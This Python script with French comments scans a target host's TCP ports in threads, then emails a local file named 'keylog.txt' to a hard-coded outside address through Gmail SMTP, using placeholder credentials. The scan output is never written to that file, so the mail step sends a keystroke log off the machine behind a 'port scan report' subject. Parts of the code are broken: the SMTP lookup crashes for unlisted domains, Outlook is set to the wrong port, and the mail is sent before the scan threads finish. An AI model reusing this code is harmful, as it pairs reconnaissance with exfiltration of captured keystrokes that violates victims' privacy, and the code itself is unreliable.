# Importer les modules nécessaires
import socket
import optparse
from threading import *
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Créer un objet sémaphore pour gérer l'affichage des résultats
screenLock = Semaphore(value=1)

# Définir une fonction qui teste si un port est ouvert


def isPortOpen(host, port):
    # Créer un objet socket
    s = socket.socket()
    try:
        # Tenter de se connecter à l'hôte sur le port
        s.connect((host, port))
        # Acquérir le verrou d'affichage
        screenLock.acquire()
        # Afficher le résultat
        print(f"Port {port} ouvert")
    except Exception as e:
        # Acquérir le verrou d'affichage
        screenLock.acquire()
        # Afficher le résultat
        print(f"Port {port} fermé")
    finally:
        # Relâcher le verrou d'affichage
        screenLock.release()
        # Fermer le socket
        s.close()

# Définir une fonction qui scanne une liste de ports


def scan(host, ports):
    try:
        # Récupérer l'adresse IP de l'hôte
        ip = socket.gethostbyname(host)
    except Exception as e:
        # Afficher l'erreur et quitter le programme
        print(str(e))
        exit(0)
    try:
        # Récupérer le nom de l'hôte
        hostname = socket.gethostbyaddr(ip)
        # Afficher les résultats
        print(f"Résultats pour {hostname}")
    except:
        # Afficher les résultats
        print(f"Résultats pour {ip}")
    # Parcourir la liste de ports
    for port in ports:
        # Créer un objet thread qui appelle la fonction isPortOpen
        t = Thread(target=isPortOpen, args=(ip, int(port)))
        # Lancer le thread
        t.start()

# Définir une fonction qui envoie les logs par mail


def send_log(log_file, email_address, email_password, email_receiver):
    # Créer un objet message
    message = MIMEMultipart("alternative")
    # Ajouter un sujet
    message["Subject"] = "Rapport de scan de ports"
    # Ajouter un émetteur
    message["From"] = email_address
    # Ajouter un destinataire
    message["To"] = email_receiver
    # Lire le contenu du fichier de log
    with open(log_file, "r") as f:
        log_content = f.read()
    # Créer un objet MIMEText avec le contenu du log
    log_mime = MIMEText(log_content, "plain")
    # Attacher le MIMEText au message
    message.attach(log_mime)
    # Récupérer le serveur SMTP et le port du fournisseur de mail
    smtp_address, smtp_port = get_smtp_info(email_address)
    # Créer la connexion SSL
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_address, smtp_port, context=context) as server:
        # Se connecter au compte
        server.login(email_address, email_password)
        # Envoyer le message
        server.sendmail(email_address, email_receiver, message.as_string())

# Définir une fonction qui renvoie le serveur SMTP et le port en fonction du fournisseur de mail


def get_smtp_info(email_address):
    # Extraire le domaine du mail
    domain = email_address.split("@")[1]
    # Définir un dictionnaire des serveurs SMTP et des ports des principaux fournisseurs
    smtp_dict = {
        "gmail.com": ("smtp.gmail.com", 465),
        "yahoo.com": ("smtp.mail.yahoo.com", 465),
        "outlook.com": ("smtp.office365.com", 587),
    }
    # Renvoyer le serveur SMTP et le port correspondant au domaine, ou None si non trouvé
    return smtp_dict.get(domain, None)


# Définir le nom du fichier de log
log_file = "keylog.txt"

# Définir les informations sur l'adresse mail
email_address = "example@gmail.com"
email_password = "my_password"
email_receiver = "another.example@yahoo.com"

# Définir la fonction principale


def main():
    # Créer un objet parser pour gérer les options en ligne de commande
    parser = optparse.OptionParser()
    # Ajouter une option pour spécifier les ports à scanner
    parser.add_option("-p", "--ports", dest="ports",
                      default="21,22,23,80,443", help="Ports à scanner", type="string")
    # Récupérer les options et les arguments
    (options, args) = parser.parse_args()
    # Convertir la liste de ports en une liste d'entiers
    ports = [int(p) for p in options.ports.split(",")]
    # Vérifier qu'un argument a été fourni
    if len(args) < 1:
        # Afficher un message d'erreur et quitter le programme
        print("Il faut un hostname")
        exit(0)
    # Récupérer le premier argument comme l'hôte à scanner
    host = args[0]
    # Appeler la fonction scan
    scan(host, ports)
    # Appeler la fonction send_log
    send_log(log_file, email_address, email_password, email_receiver)


# Vérifier si le fichier est exécuté comme script principal
if __name__ == "__main__":
    # Appeler la fonction principale
    main()
